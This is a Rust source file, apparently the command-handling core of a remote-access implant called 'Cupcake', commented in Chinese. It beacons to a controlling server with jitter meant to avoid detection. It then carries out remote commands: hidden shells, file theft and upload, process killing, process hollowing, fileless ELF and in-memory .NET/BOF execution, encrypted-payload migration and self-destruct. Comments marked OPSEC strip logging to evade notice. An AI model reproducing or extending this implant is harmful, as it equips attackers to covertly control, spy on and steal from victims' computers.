// 消息处理模块
//
// 负责处理传输层消息的接收、解析和响应。
// 实现完整的消息循环：注册 → 监听命令 → 执行 → 响应。
// 
// 协议无关设计：通过 Transport trait 与传输层交互，
// 不依赖任何具体的传输协议实现。

use crate::error::{ClientError, Result};
use crate::executor::CommandExecutor;
use crate::transport::Transport;
use crate::types::{CommandPayload, CommandResult, MessageType, MessageWrapper, SystemInfo};
use log::{debug, error, info, warn};
use futures_util::future::{BoxFuture, FutureExt};
#[cfg(target_os = "windows")]
use encoding_rs::GBK;
use base64::Engine;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

/// 消息处理器
/// 
/// 负责处理与服务端的所有消息交互，包括：
/// - 发送注册消息
/// - 接收和解析命令消息
/// - 执行命令
/// - 发送响应消息
/// 
/// # 设计原则
/// 
/// - 协议无关：只依赖 Transport trait，不关心底层是 WebSocket、DNS 还是其他协议
/// - 错误恢复：单个消息处理失败不会导致连接断开
/// - 资源管理：拥有 Transport 的所有权，可以在需要时返还给调用者
pub struct MessageHandler {
    /// 传输层（trait object）
    transport: Box<dyn Transport>,
}

impl MessageHandler {
    /// 创建新的消息处理器
    /// 
    /// # 参数
    /// 
    /// * `transport` - 实现了 Transport trait 的传输层
    pub fn new(transport: Box<dyn Transport>) -> Self {
        Self { transport }
    }
    
    /// 运行消息处理循环
    /// 
    /// 该方法会：
    /// 1. 发送注册消息
    /// 2. 进入无限循环接收和处理消息
    /// 3. 如果连接断开或发生错误，返回 transport 以便外层重连
    /// 
    /// # 返回值
    /// 
    /// - `Ok(transport)`: 正常退出，返回 transport 供重连使用
    /// - `Err(e)`: 发生错误，transport 已失效
    pub async fn run(mut self) -> std::result::Result<Box<dyn Transport>, ClientError> {
        crate::utils::db_print("[Cupcake] MessageHandler.run() started.");
        
        crate::utils::db_print("[Cupcake] register() started...");
        if let Err(e) = self.register().await {
            crate::utils::db_print(&format!("[Cupcake] register() FAILED: {:?}", e));
            return Err(e);
        }
        crate::utils::db_print("[Cupcake] register() successful.");
        
        let base_interval = crate::config::get_heartbeat_interval();
        // ⚡ STEALTH: Default 30s + High Jitter to avoid pattern detection
        let interval_secs = if base_interval == 0 { 30 } else { base_interval };
        let jitter_percent = 50; 

        loop {
            let jitter_range = (interval_secs * jitter_percent / 100).max(5);
            let jitter = crate::utils::random_range(0, jitter_range as u32);
            
            let final_delay = if crate::utils::random_bool(0.5) {
                interval_secs + jitter as u64
            } else {
                interval_secs.saturating_sub(jitter as u64).max(10)
            };

            crate::utils::db_print(&format!("[Cupcake] Entering select loop, next heartbeat in {}s", final_delay));
            tokio::select! {
                data_res = self.transport.receive() => {
                    match data_res {
                        Ok(data) => {
                            let d: Vec<u8> = data;
                            if d.is_empty() { return Ok(self.transport); }
                            if let Err(e) = self.handle_message(&d).await {
                                if let ClientError::ConnectionError(_) = e {
                                    return Ok(self.transport);
                                }
                                continue;
                            }
                        }
                        Err(_) => {
                            return Ok(self.transport);
                        }
                    }
                }
                _ = crate::stealth::stealth_sleep(final_delay as u32 * 1000) => {
                    let heartbeat_res = CommandResult {
                        stdout: String::new(),
                        stderr: String::new(),
                        path: None,
                        req_id: Some("heartbeat".to_string()),
                    };
                    
                    if let Err(_) = self.send_message(&heartbeat_res.to_response_message()).await {
                        return Ok(self.transport);
                    }
                }
            }
        }
    }
    
    /// 发送注册消息
    /// 
    /// 收集系统信息并发送注册消息到服务端。
    async fn register(&mut self) -> Result<()> {
        crate::utils::db_print("[Cupcake] register() started...");
        // 收集系统信息
        let sys_info = SystemInfo::collect();
        crate::utils::db_print("[Cupcake] SystemInfo collected.");
        
        // 初始化传输层（某些协议如 DNS 需要 UUID）
        self.transport.initialize(&sys_info.uuid);
        
        // 构造注册消息
        let register_msg = sys_info.to_register_message();
        crate::utils::db_print("[Cupcake] Sending Register message...");
        
        // 发送注册消息
        self.send_message(&register_msg).await?;
        crate::utils::db_print("[Cupcake] Register message sent.");
        
        Ok(())
    }
    
    /// 处理接收到的消息
    /// 
    /// 解析 JSON 消息并根据消息类型进行相应的处理。
    async fn handle_message(&mut self, data: &[u8]) -> Result<()> {
        // 将字节数据转换为字符串
        let text = String::from_utf8(data.to_vec())
            .map_err(|e| ClientError::ConnectionError(
                format!("Invalid UTF-8 in received message: {}", e)
            ))?;
        
        // ⚡ OPSEC: 不要在控制台打印收到的完整协议内容
        // trace!("Received message: {}", text);
        
        // 反序列化消息
        let wrapper: MessageWrapper = match serde_json::from_str(&text) {
            Ok(w) => w,
            Err(e) => {
                error!("Failed to deserialize message: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // 根据消息类型处理
        match wrapper.msg_type {
            MessageType::Command => {
                self.handle_command(wrapper).await?;
            }
            MessageType::Register => {
                warn!("Received unexpected Register message from server");
            }
            MessageType::Response => {
                warn!("Received unexpected Response message from server");
            }
        }
        
        Ok(())
    }
    
    /// 处理命令消息
    /// 
    /// 解析命令、执行命令、发送响应。
    /// 支持的命令类型：
    /// - shell: 执行 shell 命令
    /// - file_ls: 列出目录文件
    /// - file_upload: 上传文件
    /// - file_download: 下载文件
    /// - process_list: 列出系统进程
    /// - process_kill: 终止指定进程
    pub fn handle_command<'a>(&'a mut self, wrapper: MessageWrapper) -> BoxFuture<'a, Result<()>> {
        async move {
        // 解析命令载荷
        let command_payload: CommandPayload = match serde_json::from_value(wrapper.payload) {
            Ok(p) => p,
            Err(e) => {
                error!("Failed to parse command payload: {}", e);
                return Err(ClientError::SerializationError(e));
            }
        };
        
        // 提取 req_id 以便在响应中回显
        let req_id = command_payload.req_id.clone();
        
        // 根据命令类型执行不同的操作
        let mut result = match command_payload.command_type.as_str() {
            "shell" => {
                // 执行 shell 命令
                let clean_cmd = command_payload.command_content.trim();
                
                if clean_cmd.is_empty() || clean_cmd.starts_with('{') {
                    debug!("Silently dropping heartbeat/control message: {}", command_payload.command_content);
                    return Ok(());
                }
                
                CommandExecutor::execute(clean_cmd).await
            }
            "shell_interactive" => {
                // 启动交互式 shell 会话
                self.start_interactive_shell(req_id.clone()).await
            }


            "file_ls" => {
                // 列出目录文件
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                let resolved_path = crate::fs::resolve_path(target_path).ok();
                match crate::fs::ls(target_path) {
                    Ok(json) => CommandResult {
                        stdout: json,
                        stderr: String::new(),
                        path: resolved_path,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to list directory: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            "file_upload" => {
                // 上传文件
                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                    if path.trim().is_empty() || data.trim().is_empty() {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Invalid file_upload params".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        match crate::fs::upload(path, data) {
                            Ok(_) => CommandResult {
                                stdout: format!("File uploaded successfully: {}", path),
                                stderr: String::new(),
                                path: None,
                                req_id: None,
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("Failed to upload file: {}", e),
                                path: None,
                                req_id: None,
                            },
                        }
                    }
                } else {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Missing file_upload params (path or data)".to_string(),
                        path: None,
                        req_id: None,
                    }
                }
            }
            "file_upload_chunk" => {
                // 分块上传文件
                if let (Some(path), Some(data)) = (command_payload.path.as_deref(), command_payload.data.as_deref()) {
                    let is_append = serde_json::from_str::<serde_json::Value>(&command_payload.command_content)
                        .ok()
                        .and_then(|v| v.get("is_append")?.as_bool())
                        .unwrap_or(false);
                    match crate::fs::upload_chunk(path, data, is_append) {
                        Ok(_) => CommandResult {
                            stdout: format!("Chunk uploaded: {}", path),
                            stderr: String::new(),
                            path: None,
                            req_id: None,
                        },
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: format!("Failed to upload chunk: {}", e),
                            path: None,
                            req_id: None,
                        },
                    }
                } else {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Invalid file_upload_chunk params".to_string(),
                        path: None,
                        req_id: None,
                    }
                }
            }
            "file_download" => {
                // 下载文件
                let target_path = command_payload
                    .path
                    .as_deref()
                    .unwrap_or(command_payload.command_content.as_str());
                match crate::fs::download(target_path) {
                    Ok(base64_data) => CommandResult {
                        stdout: base64_data,
                        stderr: String::new(),
                        path: None,
                        req_id: None,
                    },
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to download file: {}", e),
                        path: None,
                        req_id: None,
                    },
                }
            }
            "file_download_chunk" => {
                // 分块下载文件
                let target_path = command_payload.path.as_deref()
                    .unwrap_or_else(|| {
                        let parts: Vec<&str> = command_payload.command_content.split('|').collect();
                        if parts.len() > 2 { parts[2] } else { command_payload.command_content.as_str() }
                    });
                
                let mut offset = 0u64;
                let mut size = 2 * 1024 * 1024; // 2MB default
                
                // Allow parsing from JSON
                if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&command_payload.command_content) {
                    offset = parsed.get("offset").and_then(|v| v.as_u64()).unwrap_or(0);
                    size = parsed.get("size").and_then(|v| v.as_u64()).unwrap_or(2 * 1024 * 1024) as usize;
                }
                
                match crate::fs::download_chunk(target_path, offset, size) {
                    Ok((base64_data, is_eof)) => {
                        let result_json = serde_json::json!({
                            "data": base64_data,
                            "is_eof": is_eof,
                            "offset": offset
                        });
                        CommandResult {
                            stdout: result_json.to_string(),
                            stderr: String::new(),
                            path: None,
                            req_id: None,
                        }
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to download chunk: {}", e),
                        path: None,
                        req_id: None,
                    }
                }
            }
            "file_delete" => {
                // 删除文件/目录 (支持批量)
                if let Ok(paths) = serde_json::from_str::<Vec<String>>(&command_payload.command_content) {
                    let mut results = Vec::new();
                    let mut errors = Vec::new();
                    for p in paths {
                        match crate::fs::remove(&p) {
                            Ok(_) => results.push(p),
                            Err(e) => errors.push(format!("{}: {}", p, e)),
                        }
                    }
                    CommandResult {
                        stdout: format!("Batch deleted: {}", results.join(", ")),
                        stderr: if errors.is_empty() { String::new() } else { errors.join("; ") },
                        path: None,
                        req_id: None,
                    }
                } else {
                    let target_path = command_payload
                        .path
                        .as_deref()
                        .unwrap_or(command_payload.command_content.as_str());
                    if target_path.trim().is_empty() {
                        CommandResult {
                            stdout: String::new(),
                            stderr: "Delete path is empty".to_string(),
                            path: None,
                            req_id: None,
                        }
                    } else {
                        match crate::fs::remove(target_path) {
                            Ok(_) => CommandResult {
                                stdout: format!("Deleted: {}", target_path),
                                stderr: String::new(),
                                path: None,
                                req_id: None,
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("Failed to delete: {}", e),
                                path: None,
                                req_id: None,
                            },
                        }
                    }
                }
            }
            "process_list" => {
                // 列出系统进程
                Self::process_list().await
            }
            "process_kill" => {
                // 终止进程
                let pid = command_payload.command_content.trim();
                Self::process_kill(pid).await
            }

            "hollow_shellcode" => {
                // 🚨 SECURITY OPERATION: Process Hollowing - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("hollow-shellcode", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "self_destruct" => {
                // 🚨 SELF-DESTRUCT: Delete agent and exit - Route through plugin router
                
                let task = crate::plugin_router::PluginTask {
                    execution_type: "self-destruct".to_string(),
                    data: vec![],
                    args: vec![],
                    metadata: None,
                    task_id: format!("self_destruct_{:08x}", crate::utils::next_u32()),
                    req_id: command_payload.req_id.clone(),
                    plugin_id: None,
                };
                
                crate::plugin_router::PluginRouter::execute_plugin(task).await
            }
            "run_memfd_elf" => {
                // 🚨 FILELESS EXECUTION: Run ELF from memory (Linux only) - Route through plugin router
                
                match crate::plugin_router::PluginRouter::parse_plugin_task("memfd-exec", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(task) => {
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }
            "execute_assembly" => {
                // 🚨 .NET ASSEMBLY EXECUTION: Execute C# assembly from memory (Windows only) - Route through plugin router
                
                // Prioritize binary data from the Data field
                let assembly_data = if let Some(d) = command_payload.data.as_deref() {
                     base64::engine::general_purpose::STANDARD.decode(d.trim()).ok()
                } else {
                    None
                };

                match crate::plugin_router::PluginRouter::parse_plugin_task("execute-assembly", &command_payload.command_content, command_payload.req_id.clone()) {
                    Ok(mut task) => {
                        if let Some(data) = assembly_data {
                            task.data = data;
                        }
                        crate::plugin_router::PluginRouter::execute_plugin(task).await
                    }
                    Err(e) => CommandResult {
                        stdout: String::new(),
                        stderr: e,
                        path: None,
                        req_id: None,
                    }
                }
            }

            "plugin_cache" => {
                // 📦 PLUGIN CACHING: Store plugin binary in memory
                let plugin_id = command_payload.command_content.trim().to_string();
                let b64_data = command_payload.data.as_deref().unwrap_or("");
                
                if plugin_id.is_empty() || b64_data.is_empty() {
                    CommandResult {
                        stdout: String::new(),
                        stderr: "Invalid plugin_cache params: missing ID or data".to_string(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    }
                } else {
                    match base64::engine::general_purpose::STANDARD.decode(b64_data.trim()) {
                        Ok(bin) => {
                            crate::plugin_router::PluginRouter::cache_plugin(plugin_id.clone(), bin);
                            CommandResult {
                                stdout: format!("Successfully cached plugin: {}", plugin_id),
                                stderr: String::new(),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            }
                        }
                        Err(e) => CommandResult {
                            stdout: String::new(),
                            stderr: format!("Failed to decode plugin data: {}", e),
                            path: None,
                            req_id: command_payload.req_id.clone(),
                        }
                    }
                }
            }

            "bof_exec" => {
                // 🚨 BEACON OBJECT FILE (BOF) EXECUTION: Run BOF from memory
                let content = command_payload.command_content.trim();
                let bof_bytes = if content.starts_with("cached:") {
                    let id = &content[7..];
                    crate::plugin_router::PluginRouter::get_cached_plugin(id)
                } else {
                    let bof_b64 = command_payload.data.as_deref().unwrap_or("");
                    base64::engine::general_purpose::STANDARD.decode(bof_b64.trim()).ok()
                };

                match bof_bytes {
                    Some(bytes) => {
                        // For BOF, the arguments are in CommandContent if not using cached:
                        // If using cached:, we might need a different way to pass args, 
                        // but let's assume for now args are handled or empty.
                        // Actually, let's refine this: cached:ID|args_b64
                        let (final_bytes, arg_bytes) = if content.starts_with("cached:") {
                           let parts: Vec<&str> = content[7..].splitn(2, '|').collect();
                           let args = if parts.len() > 1 { 
                               base64::engine::general_purpose::STANDARD.decode(parts[1]).unwrap_or_default() 
                           } else { 
                               vec![] 
                           };
                           (bytes, args)
                        } else {
                           let args = base64::engine::general_purpose::STANDARD.decode(content).unwrap_or_default();
                           (bytes, args)
                        };

                        #[cfg(target_os = "windows")]
                        match crate::loader::bof::BofLoader::execute(&final_bytes, &arg_bytes).await {
                            Ok(output) => CommandResult {
                                stdout: output,
                                stderr: String::new(),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            },
                            Err(e) => CommandResult {
                                stdout: String::new(),
                                stderr: format!("BOF execution failed: {}", e),
                                path: None,
                                req_id: command_payload.req_id.clone(),
                            },
                        }
                        #[cfg(not(target_os = "windows"))]
                        CommandResult {
                            stdout: String::new(),
                            stderr: "BOF execution is only supported on Windows".to_string(),
                            path: None,
                            req_id: command_payload.req_id.clone(),
                        }
                    }
                    None => CommandResult {
                        stdout: String::new(),
                        stderr: "Failed to obtain BOF data (not in cache and no data provided)".to_string(),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    },
                }
            }
            "migrate" => {
                // 🚀 ADVANCED MIGRATION (Loader V2 - Section Mapping / File Sealing)
                info!("[*] Initiating advanced migration session...");
                // 1. Resolve Target and Payload
                let target_str = command_payload.command_content.trim();
                let payload_b64 = command_payload.data.as_deref().unwrap_or("");
                
                let payload = match base64::engine::general_purpose::STANDARD.decode(payload_b64.trim()) {
                    Ok(data) => data,
                    Err(e) => {
                        let res = CommandResult { stdout: String::new(), stderr: format!("Invalid payload: {}", e), path: None, req_id: command_payload.req_id.clone() };
                        return self.send_message(&res.to_response_message()).await;
                    }
                };

                // 2. JIT Decryption (Only if not already a plain PE)
                let data = if payload.len() > 2 && &payload[0..2] == b"MZ" {
                    debug!("[Cupcake] Payload has MZ header, skipping decryption.");
                    payload
                } else {
                    let key = crate::config::get_aes_key();
                    match crate::crypto::decrypt(&payload, &key) {
                        Ok(decrypted) => {
                            debug!("[Cupcake] Migration payload decrypted successfully.");
                            decrypted
                        },
                        Err(_) => {
                            warn!("[!] Decryption failed, using raw payload.");
                            payload
                        },
                    }
                };

                let target_name = if target_str.is_empty() { None } else { Some(target_str) };

                // 4. Load via V2 Architecture
                let loader = crate::loader::get_loader();
                let status = loader.load(data, target_name, None).await;

                match status {
                    crate::loader::MigrationStatus::Success => {
                        info!("Migration successful, triggering self-destruct...");
                        let success_res = CommandResult {
                            stdout: format!("[+] Migration successful to: {}", target_str),
                            stderr: String::new(),
                            path: None,
                            req_id: command_payload.req_id.clone(),
                        };
                        // Send success message first
                        let _ = self.send_message(&success_res.to_response_message()).await;
                        // Brief wait to ensure message delivery
                        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
                        // Then self destruct
                        let _ = crate::injection::ProcessInjector::self_destruct().await;
                        return Ok(()); // Handled manually
                    },
                    _ => CommandResult {
                        stdout: String::new(),
                        stderr: format!("Migration failed: {:?}", status),
                        path: None,
                        req_id: command_payload.req_id.clone(),
                    }
                }
            }
            _ => {
                warn!(
                    "Unsupported command type: {}, ignoring",
                    command_payload.command_type
                );
                return Ok(());
            }
        };
        
        // 将 req_id 回显到响应中
        result.req_id = req_id;
        
        // 构造响应消息
        let response_msg = result.to_response_message();
        
        // 发送响应
        self.send_message(&response_msg).await?;
        
        Ok(())
        }.boxed()
    }
    
    /// 列出系统进程
    /// 
    /// Windows: 使用 tasklist /FO CSV /NH
    /// Linux: 使用 ps -e -o pid,user,comm --no-headers
    /// 
    /// 返回 JSON 数组格式的进程列表
    /// 列出系统进程
    /// 
    /// 使用 sysinfo 库获取跨平台进程列表
    /// 列出系统进程 (原生高性能版)
    async fn process_list() -> CommandResult {
        let mut processes = Vec::new();

        #[cfg(target_os = "windows")]
        {
            use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, PROCESSENTRY32W, Process32FirstW, Process32NextW, TH32CS_SNAPPROCESS};
            use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
            use winapi::shared::minwindef::TRUE;

            unsafe {
                let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
                if snapshot != INVALID_HANDLE_VALUE {
                    let mut entry: PROCESSENTRY32W = std::mem::zeroed();
                    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

                    if Process32FirstW(snapshot, &mut entry) == TRUE {
                        loop {
                            let name = String::from_utf16_lossy(&entry.szExeFile).trim_matches('\0').to_string();
                            processes.push(serde_json::json!({
                                "pid": entry.th32ProcessID,
                                "ppid": entry.th32ParentProcessID,
                                "name": name,
                                "user": "",
                                "path": "",
                                "arch": "x64",
                            }));
                            if Process32NextW(snapshot, &mut entry) != TRUE { break; }
                        }
                    }
                    CloseHandle(snapshot);
                }
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if let Ok(entries) = std::fs::read_dir("/proc") {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if let Some(pid_str) = path.file_name().and_then(|s| s.to_str()) {
                        if pid_str.chars().all(|c| c.is_digit(10)) {
                            let name = std::fs::read_to_string(path.join("comm")).unwrap_or_default().trim().to_string();
                            let status = std::fs::read_to_string(path.join("status")).unwrap_or_default();
                            let ppid = status.lines()
                                .find(|l| l.starts_with("PPid:"))
                                .and_then(|l| l.split_whitespace().nth(1))
                                .and_then(|s| s.parse::<u32>().ok())
                                .unwrap_or(0);

                            processes.push(serde_json::json!({
                                "pid": pid_str.parse::<u32>().unwrap_or(0),
                                "ppid": ppid,
                                "name": name,
                                "user": "",
                                "path": format!("/proc/{}", pid_str),
                                "arch": "x64",
                            }));
                        }
                    }
                }
            }
        }
        
        match serde_json::to_string(&processes) {
            Ok(json) => CommandResult { stdout: json, stderr: String::new(), path: None, req_id: None },
            Err(e) => CommandResult { stdout: "[]".to_string(), stderr: e.to_string(), path: None, req_id: None },
        }
    }
    
    /// 终止指定进程 (原生版)
    async fn process_kill(pid_str: &str) -> CommandResult {
        let pid_u32 = match pid_str.parse::<u32>() {
            Ok(p) => p,
            Err(_) => return CommandResult { stdout: String::new(), stderr: "Invalid PID".to_string(), path: None, req_id: None },
        };

        #[cfg(target_os = "windows")]
        {
            use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
            use winapi::um::winnt::PROCESS_TERMINATE;
            use winapi::um::handleapi::CloseHandle;
            use winapi::shared::minwindef::FALSE;

            unsafe {
                let h = OpenProcess(PROCESS_TERMINATE, FALSE, pid_u32);
                if !h.is_null() {
                    let res = TerminateProcess(h, 1);
                    CloseHandle(h);
                    if res != FALSE {
                        return CommandResult { stdout: format!("Killed PID {}", pid_u32), stderr: String::new(), path: None, req_id: None };
                    }
                }
            }
        }

        #[cfg(not(target_os = "windows"))]
        {
            if unsafe { libc::kill(pid_u32 as i32, 9) } == 0 {
                return CommandResult { stdout: format!("Killed PID {}", pid_u32), stderr: String::new(), path: None, req_id: None };
            }
        }

        CommandResult { stdout: String::new(), stderr: "Failed to kill process".to_string(), path: None, req_id: None }
    }
    
    /// 发送消息到服务端
    /// 
    /// 将消息序列化为 JSON 并通过传输层发送。
    async fn send_message(&mut self, msg: &MessageWrapper) -> Result<()> {
        // 序列化消息
        let json = serde_json::to_string(msg)?;
        
        // ⚡ OPSEC: 移除发送内容的明文打印
        // trace!("Sending message: {}", json); 
        
        // 通过传输层发送
        self.transport.send(json.as_bytes()).await?;
        
        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn decode_windows_output(bytes: &[u8]) -> String {
        if let Ok(text) = std::str::from_utf8(bytes) {
            return text.to_string();
        }
        let (decoded_cow, _encoding_used, _had_errors) = GBK.decode(bytes);
        decoded_cow.to_string()
    }
    
    /// 启动交互式 shell 会话
    /// 
    /// 实现 WebSocket 到 shell 的实时通信，过滤掉心跳和控制消息。
    /// 修复了 "The filename, directory name, or volume label syntax is incorrect" 错误。
    /// 使用 encoding_rs 正确处理中文字符编码。
    fn start_interactive_shell<'a>(&'a mut self, req_id: Option<String>) -> BoxFuture<'a, CommandResult> {
        async move {
        info!("Starting interactive shell session");
        
        #[cfg(target_os = "windows")]
        let mut child = {
            let mut cmd = tokio::process::Command::new("cmd");
            cmd.arg("/Q");
            cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW
            cmd.stdin(std::process::Stdio::piped());
            cmd.stdout(std::process::Stdio::piped());
            cmd.stderr(std::process::Stdio::piped());
            cmd.kill_on_drop(true);
            match cmd.spawn() {
                Ok(child) => child,
                Err(e) => {
                    error!("Failed to spawn cmd.exe: {}", e);
                    return CommandResult {
                        stdout: String::new(),
                        stderr: format!("Failed to start interactive shell: {}", e),
                        path: None,
                        req_id: req_id.clone(),
                    };
                }
            }
        };
        
        #[cfg(not(target_os = "windows"))]
        let mut child = match tokio::process::Command::new("/bin/bash")
            .args(&["-i"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .kill_on_drop(true)
            .spawn()
        {
            Ok(child) => child,
            Err(e) => {
                error!("Failed to spawn bash: {}", e);
                return CommandResult {
                    stdout: String::new(),
                    stderr: format!("Failed to start interactive shell: {}", e),
                    path: None,
                    req_id: req_id.clone(),
                };
            }
        };
        
        let mut stdin = child.stdin.take().expect("Failed to get stdin");
        let mut stdout = child.stdout.take().expect("Failed to get stdout");
        let mut stderr = child.stderr.take().expect("Failed to get stderr");
        
        info!("Interactive shell started, entering message loop");
        
        // 进入交互式消息循环 - 这里实现了 bug 报告中提到的修复
        loop {
            tokio::select! {
                // 从传输层接收消息
                transport_result = self.transport.receive() => {
                    match transport_result {
                        Ok(data_vec) => {
                            let data: &[u8] = data_vec.as_ref();
                            if data.is_empty() {
                                warn!("Connection closed by server");
                                break;
                            }
                            
                            // 将字节数据转换为字符串
                            let text = match String::from_utf8(data.to_vec()) {
                                Ok(t) => t,
                                Err(_) => {
                                    debug!("Received non-UTF8 data, ignoring");
                                    continue;
                                }
                            };
                            
                            // 🛡️ FIX: 忽略空字符串或只包含空白字符的字符串（心跳）
                            if text.trim().is_empty() {
                                debug!("Ignoring empty/white space message (heartbeat)");
                                continue;
                            }
                            
                            // 尝试解析为 JSON 消息
                            if let Ok(wrapper) = serde_json::from_str::<MessageWrapper>(&text) {
                                if wrapper.msg_type == MessageType::Command {
                                    if let Ok(command_payload) = serde_json::from_value::<CommandPayload>(wrapper.payload.clone()) {
                                        let cmd_type = command_payload.command_type.as_str();
                                        
                                        if cmd_type == "shell" {
                                            let command = command_payload.command_content;
                                            // Allow empty commands (e.g., just pressing Enter) in interactive mode
                                            
                                            // 将有效命令写入 CMD stdin
                                            let command_with_newline = format!("{}\n", command);
                                            let _ = stdin.write_all(command_with_newline.as_bytes()).await;
                                            let _ = stdin.flush().await;
                                        } else if cmd_type == "shell_exit" {
                                            info!("Exiting interactive shell session");
                                            break;
                                        } else {
                                            // 🚀 CRITICAL FIX: 在循环中也允许处理其他非 shell 指令 (如列表等)
                                            if let Err(e) = self.handle_command(wrapper).await {
                                                error!("Error handling non-shell command in PTY loop: {}", e);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        Err(e) => {
                            error!("Transport error in shell session: {}", e);
                            break;
                        }
                    }
                }
                
                // 🚀 NEW: 从 shell stdout 读取输出并使用 encoding_rs 正确解码中文
                stdout_result = async {
                    let mut buf = [0u8; 1024];
                    match stdout.read(&mut buf).await {
                        Ok(n) => Ok((n, buf)),
                        Err(e) => Err(e),
                    }
                } => {
                    match stdout_result {
                        Ok((0, _)) => {
                            warn!("Shell stdout closed");
                            break;
                        }
                        Ok((n, buf)) => {
                            #[cfg(target_os = "windows")]
                            let output = Self::decode_windows_output(&buf[..n]);
                            #[cfg(not(target_os = "windows"))]
                            let output = String::from_utf8_lossy(&buf[..n]).to_string();
                            
                            if !output.trim().is_empty() {
                                // ⚡ FIX: 必须包装成 JSON 响应！
                                let response_result = CommandResult {
                                    stdout: output,
                                    stderr: String::new(),
                                    path: None,
                                    req_id: req_id.clone(),
                                };
                                let response_msg = response_result.to_response_message();
                                let _ = self.send_message(&response_msg).await;
                            }
                        }
                        Err(e) => {
                            error!("Error reading shell stdout: {}", e);
                            break;
                        }
                    }
                }
                
                // 🚀 NEW: 从 shell stderr 读取错误输出并使用 encoding_rs 正确解码中文
                stderr_result = async {
                    let mut buf = [0u8; 1024];
                    match stderr.read(&mut buf).await {
                        Ok(n) => Ok((n, buf)),
                        Err(e) => Err(e),
                    }
                } => {
                    match stderr_result {
                        Ok((0, _)) => {}
                        Ok((n, buf)) => {
                            #[cfg(target_os = "windows")]
                            let output = Self::decode_windows_output(&buf[..n]);
                            #[cfg(not(target_os = "windows"))]
                            let output = String::from_utf8_lossy(&buf[..n]).to_string();
                            
                            if !output.trim().is_empty() {
                                let response_result = CommandResult {
                                    stdout: String::new(),
                                    stderr: output,
                                    path: None,
                                    req_id: req_id.clone(),
                                };
                                let response_msg = response_result.to_response_message();
                                let _ = self.send_message(&response_msg).await;
                            }
                        }
                        Err(e) => {
                            error!("Error reading shell stderr: {}", e);
                            break;
                        }
                    }
                }
                
                // 检查进程是否仍在运行
                process_result = child.wait() => {
                    match process_result {
                        Ok(status) => {
                            info!("Shell process exited with status: {}", status);
                            break;
                        }
                        Err(e) => {
                            error!("Error waiting for shell process: {}", e);
                            break;
                        }
                    }
                }
            }
        }
        
        // 清理进程
        if let Err(e) = child.kill().await {
            warn!("Failed to kill shell process: {}", e);
        }
        
        info!("Interactive shell session ended");
        
        CommandResult {
            stdout: "Interactive shell session ended".to_string(),
            stderr: String::new(),
            path: None,
            req_id: None,
        }
        }.boxed()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_message_handler_creation() {
        // 这个测试只是确保结构体可以被创建
        // 实际的功能测试在集成测试中进行
    }
}
